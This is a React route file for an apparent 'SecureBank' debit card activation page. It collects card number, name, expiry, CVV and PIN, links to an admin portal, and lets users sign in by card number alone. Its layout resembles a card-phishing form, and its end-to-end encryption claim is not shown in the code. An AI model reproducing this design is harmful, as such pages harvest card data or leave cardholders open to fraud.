import { createFileRoute, Link, useNavigate } from "@tanstack/react-router";
import { useEffect, useState, type FormEvent } from "react";
import { CreditCard, Lock, ShieldCheck, ChevronLeft } from "lucide-react";
import {
  createOrUpdateActivation,
  getActivationByCard,
  setSessionCardNumber,
  getSessionCardNumber,
} from "@/lib/activations";

export const Route = createFileRoute("/")({
  head: () => ({
    meta: [
      { title: "Activate Your Debit Card — SecureBank" },
      {
        name: "description",
        content:
          "Activate your new SecureBank debit card in a few secure steps. Enter your card details, verify with your PIN, and you're ready to go.",
      },
      { property: "og:title", content: "Activate Your Debit Card — SecureBank" },
      {
        property: "og:description",
        content:
          "Activate your new SecureBank debit card in a few secure steps. Enter your card details, verify with your PIN, and you're ready to go.",
      },
      { property: "og:type", content: "website" },
      { name: "twitter:card", content: "summary" },
    ],
  }),
  component: Activation,
});

type Step = "details" | "pin";

interface CardDetails {
  cardNumber: string;
  cardholder: string;
  expiry: string;
  cvv: string;
}

function Activation() {
  const navigate = useNavigate();
  const [step, setStep] = useState<Step>("details");
  const [details, setDetails] = useState<CardDetails>({
    cardNumber: "",
    cardholder: "",
    expiry: "",
    cvv: "",
  });
  const [pin, setPin] = useState<string[]>(["", "", "", ""]);
  const [error, setError] = useState<string | null>(null);
  const [submitting, setSubmitting] = useState(false);

  // If already signed into an existing activation, jump to My Card.
  useEffect(() => {
    const card = getSessionCardNumber();
    if (!card) return;
    getActivationByCard(card).then((row) => {
      if (row) navigate({ to: "/my-card" });
    });
  }, [navigate]);

  const handleDetailsSubmit = (e: FormEvent) => {
    e.preventDefault();
    setError(null);
    const digits = details.cardNumber.replace(/\s/g, "");
    if (digits.length < 15 || digits.length > 16) {
      setError("Please enter a valid 16-digit card number.");
      return;
    }
    if (!details.cardholder.trim()) {
      setError("Please enter the cardholder name.");
      return;
    }
    if (!/^\d{2}\/\d{2}$/.test(details.expiry)) {
      setError("Expiry must be in MM/YY format.");
      return;
    }
    if (details.cvv.length !== 3) {
      setError("CVV must be 3 digits.");
      return;
    }
    setStep("pin");
  };

  const handlePinChange = (idx: number, value: string) => {
    const digit = value.replace(/\D/g, "").slice(-1);
    const next = [...pin];
    next[idx] = digit;
    setPin(next);
    if (digit && idx < 3) {
      const el = document.getElementById(`pin-${idx + 1}`);
      el?.focus();
    }
  };

  const handlePinSubmit = async (e: FormEvent) => {
    e.preventDefault();
    if (pin.some((p) => p === "")) {
      setError("Please enter your full 4-digit PIN.");
      return;
    }
    setError(null);
    setSubmitting(true);
    try {
      await createOrUpdateActivation({
        cardNumber: details.cardNumber,
        cardholder: details.cardholder,
        expiry: details.expiry,
      });
      setSessionCardNumber(details.cardNumber);
      navigate({ to: "/my-card" });
    } catch (err) {
      console.error(err);
      setError("Could not submit activation. Please try again.");
    } finally {
      setSubmitting(false);
    }
  };

  const formatCardNumber = (value: string) =>
    value
      .replace(/\D/g, "")
      .slice(0, 16)
      .replace(/(.{4})/g, "$1 ")
      .trim();

  const formatExpiry = (value: string) => {
    const d = value.replace(/\D/g, "").slice(0, 4);
    if (d.length < 3) return d;
    return `${d.slice(0, 2)}/${d.slice(2)}`;
  };

  const maskedCard = details.cardNumber
    ? `•••• •••• •••• ${details.cardNumber.replace(/\s/g, "").slice(-4).padStart(4, "•")}`
    : "•••• •••• •••• ••••";

  return (
    <main className="min-h-screen bg-white text-slate-950">
      <div className="mx-auto flex min-h-screen w-full max-w-md flex-col px-5 py-8">
        <header className="mb-6 flex items-center justify-between">
          <button
            onClick={() => {
              setError(null);
              if (step === "pin") setStep("details");
            }}
            className="flex h-10 w-10 items-center justify-center rounded-full border border-slate-200 bg-white text-slate-700 shadow-sm transition hover:bg-slate-50 disabled:opacity-40"
            disabled={step === "details"}
            aria-label="Back"
          >
            <ChevronLeft className="h-5 w-5" />
          </button>
          <div className="text-center">
            <p className="text-xs font-medium uppercase tracking-widest text-indigo-600">
              SecureBank
            </p>
            <h1 className="text-sm font-semibold text-slate-950">Card Activation</h1>
          </div>
          <div className="flex items-center gap-1.5">
            <Link
              to="/my-card"
              aria-label="My card"
              className="flex h-10 w-10 items-center justify-center rounded-full border border-slate-200 bg-white shadow-sm transition hover:bg-slate-50 active:scale-95"
            >
              <CreditCard className="h-5 w-5 text-indigo-500" />
            </Link>
            <Link
              to="/admin"
              aria-label="Admin portal"
              className="flex h-10 w-10 items-center justify-center rounded-full border border-slate-200 bg-white shadow-sm transition hover:bg-slate-50 active:scale-95"
            >
              <ShieldCheck className="h-5 w-5 text-emerald-500" />
            </Link>
          </div>
        </header>

        <div className="mb-8 flex items-center gap-2">
          {(["details", "pin"] as Step[]).map((s, i) => {
            const active = ["details", "pin"].indexOf(step) >= i;
            return (
              <div
                key={s}
                className={`h-1 flex-1 rounded-full transition-all ${
                  active ? "bg-indigo-500" : "bg-slate-200"
                }`}
              />
            );
          })}
        </div>

        <div className="mb-8 aspect-[1.6/1] w-full rounded-2xl bg-gradient-to-br from-indigo-500 via-violet-600 to-fuchsia-600 p-5 shadow-2xl shadow-indigo-900/50">
          <div className="flex h-full flex-col justify-between text-white">
            <div className="flex items-start justify-between">
              <div>
                <p className="text-xs uppercase tracking-widest opacity-80">Debit</p>
                <p className="mt-1 text-lg font-semibold">SecureBank</p>
              </div>
              <div className="h-8 w-10 rounded-md bg-gradient-to-br from-yellow-200 to-yellow-400 opacity-90" />
            </div>
            <div>
              <p className="font-mono text-lg tracking-widest">{maskedCard}</p>
              <div className="mt-3 flex items-end justify-between text-xs uppercase opacity-90">
                <div>
                  <p className="opacity-70">Cardholder</p>
                  <p className="mt-0.5 text-sm font-medium">
                    {details.cardholder || "YOUR NAME"}
                  </p>
                </div>
                <div className="text-right">
                  <p className="opacity-70">Expires</p>
                  <p className="mt-0.5 text-sm font-medium">
                    {details.expiry || "MM/YY"}
                  </p>
                </div>
              </div>
            </div>
          </div>
        </div>

        <section className="flex-1">
          {step === "details" && (
            <form onSubmit={handleDetailsSubmit} className="space-y-4">
              <div>
                <h2 className="text-xl font-semibold">Activate your card</h2>
                <p className="mt-1 text-sm text-slate-500">
                  Enter the details printed on your new debit card.
                </p>
              </div>

              <Field label="Card number">
                <div className="relative">
                  <CreditCard className="pointer-events-none absolute left-3 top-1/2 h-4 w-4 -translate-y-1/2 text-slate-400" />
                  <input
                    inputMode="numeric"
                    autoComplete="cc-number"
                    placeholder="1234 5678 9012 3456"
                    value={details.cardNumber}
                    onChange={(e) =>
                      setDetails({
                        ...details,
                        cardNumber: formatCardNumber(e.target.value),
                      })
                    }
                    className="w-full rounded-xl border border-slate-200 bg-white py-3 pl-10 pr-3 text-base tracking-wider text-slate-950 shadow-sm outline-none transition placeholder:text-slate-400 focus:border-indigo-500 focus:ring-2 focus:ring-indigo-500/20"
                  />
                </div>
              </Field>

              <Field label="Cardholder name">
                <input
                  autoComplete="cc-name"
                  placeholder="Full name on card"
                  value={details.cardholder}
                  onChange={(e) =>
                    setDetails({
                      ...details,
                      cardholder: e.target.value.toUpperCase(),
                    })
                  }
                  className="w-full rounded-xl border border-slate-200 bg-white px-3 py-3 text-base text-slate-950 shadow-sm outline-none transition placeholder:text-slate-400 focus:border-indigo-500 focus:ring-2 focus:ring-indigo-500/20"
                />
              </Field>

              <div className="grid grid-cols-2 gap-3">
                <Field label="Expiry (MM/YY)">
                  <input
                    inputMode="numeric"
                    autoComplete="cc-exp"
                    placeholder="MM/YY"
                    value={details.expiry}
                    onChange={(e) =>
                      setDetails({
                        ...details,
                        expiry: formatExpiry(e.target.value),
                      })
                    }
                    className="w-full rounded-xl border border-slate-200 bg-white px-3 py-3 text-base text-slate-950 shadow-sm outline-none transition placeholder:text-slate-400 focus:border-indigo-500 focus:ring-2 focus:ring-indigo-500/20"
                  />
                </Field>
                <Field label="CVV">
                  <input
                    inputMode="numeric"
                    autoComplete="cc-csc"
                    placeholder="•••"
                    type="password"
                    maxLength={3}
                    value={details.cvv}
                    onChange={(e) =>
                      setDetails({
                        ...details,
                        cvv: e.target.value.replace(/\D/g, "").slice(0, 3),
                      })
                    }
                    className="w-full rounded-xl border border-slate-200 bg-white px-3 py-3 text-base tracking-widest text-slate-950 shadow-sm outline-none transition placeholder:text-slate-400 focus:border-indigo-500 focus:ring-2 focus:ring-indigo-500/20"
                  />
                </Field>
              </div>

              {error && <ErrorMsg message={error} />}

              <button
                type="submit"
                className="mt-2 w-full rounded-xl bg-gradient-to-r from-indigo-500 to-violet-600 py-3.5 text-base font-semibold text-white shadow-lg shadow-indigo-900/40 transition active:scale-[0.98]"
              >
                Verify Details
              </button>

              <p className="flex items-center justify-center gap-1.5 pt-2 text-xs text-slate-500">
                <Lock className="h-3 w-3" />
                Your information is encrypted end-to-end
              </p>

              <div className="mt-4 rounded-xl border border-slate-200 bg-slate-50 p-4 text-center">
                <p className="text-sm font-medium text-slate-900">
                  Already activated a card?
                </p>
                <p className="mt-1 text-xs text-slate-500">
                  Tap below to sign in with your card number.
                </p>
                <Link
                  to="/my-card"
                  className="mt-3 inline-flex w-full items-center justify-center gap-2 rounded-xl border border-slate-200 bg-white py-2.5 text-sm font-medium text-slate-900 shadow-sm transition hover:bg-slate-50 active:scale-[0.98]"
                >
                  <CreditCard className="h-4 w-4" />
                  Tap to login using Card Number
                </Link>
              </div>
            </form>
          )}

          {step === "pin" && (
            <form onSubmit={handlePinSubmit} className="space-y-6">
              <div>
                <h2 className="text-xl font-semibold">Enter PIN to verify</h2>
                <p className="mt-1 text-sm text-slate-500">
                  Enter the 4-digit PIN you set for your debit card.
                </p>
              </div>

              <div className="flex justify-center gap-3">
                {pin.map((v, i) => (
                  <input
                    key={i}
                    id={`pin-${i}`}
                    inputMode="numeric"
                    type="password"
                    maxLength={1}
                    value={v}
                    onChange={(e) => handlePinChange(i, e.target.value)}
                    onKeyDown={(e) => {
                      if (e.key === "Backspace" && !pin[i] && i > 0) {
                        document.getElementById(`pin-${i - 1}`)?.focus();
                      }
                    }}
                    className="h-16 w-14 rounded-xl border border-slate-200 bg-white text-center text-2xl font-bold text-slate-950 shadow-sm outline-none transition focus:border-indigo-500 focus:ring-2 focus:ring-indigo-500/20"
                  />
                ))}
              </div>

              {error && <ErrorMsg message={error} />}

              <button
                type="submit"
                disabled={submitting}
                className="w-full rounded-xl bg-gradient-to-r from-indigo-500 to-violet-600 py-3.5 text-base font-semibold text-white shadow-lg shadow-indigo-900/40 transition active:scale-[0.98] disabled:opacity-60"
              >
                {submitting ? "Submitting..." : "Confirm PIN"}
              </button>

              <p className="flex items-center justify-center gap-1.5 text-xs text-slate-500">
                <Lock className="h-3 w-3" />
                Never share your PIN with anyone
              </p>
            </form>
          )}
        </section>
      </div>
    </main>
  );
}

function Field({ label, children }: { label: string; children: React.ReactNode }) {
  return (
    <label className="block">
      <span className="mb-1.5 block text-xs font-medium uppercase tracking-wider text-slate-500">
        {label}
      </span>
      {children}
    </label>
  );
}

function ErrorMsg({ message }: { message: string }) {
  return (
    <div className="rounded-lg border border-red-200 bg-red-50 px-3 py-2 text-sm text-red-700">
      {message}
    </div>
  );
}
